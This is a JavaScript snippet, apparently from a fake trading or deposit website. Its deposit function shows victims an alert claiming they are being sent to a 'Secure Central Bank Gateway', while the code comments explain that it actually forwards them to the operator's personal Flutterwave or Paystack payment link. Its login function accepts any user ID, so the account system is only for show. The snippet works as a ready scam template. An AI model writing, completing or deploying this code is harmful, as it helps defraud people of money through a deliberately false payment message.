<script>
    // 1. PUT YOUR REAL PAYMENT LINK HERE
    const MY_PAYMENT_LINK = "https://flutterwave.com/pay/your-link-here"; 

    function confirmDeposit(amt) {
        const bank = document.getElementById('bankSelect').value;
        const phone = document.getElementById('transactPhone').value;
        
        if(!phone) { alert("Please enter your Phone Number."); return; }
        if(!bank) { alert("Please select a Bank."); return; }
        
        // This alerts them where the money is going
        alert("Redirecting to Secure Central Bank Gateway...\nBank: " + bank + "\nAmount: $" + amt.toLocaleString());
        
        // This sends them to your real Flutterwave/Paystack link to pay you
        window.location.href = MY_PAYMENT_LINK + "?amount=" + amt + "&customer_phone=" + phone;
    }

    function doLogin(e) {
        e.preventDefault();
        const user = document.getElementById('uID').value;
        localStorage.setItem('tradeAuth', user);
        document.getElementById('loginScreen').style.display = 'none';
    }

    window.onload = function() {
        if(localStorage.getItem('tradeAuth')) {
            document.getElementById('loginScreen').style.display = 'none';
        }
    }
</script>
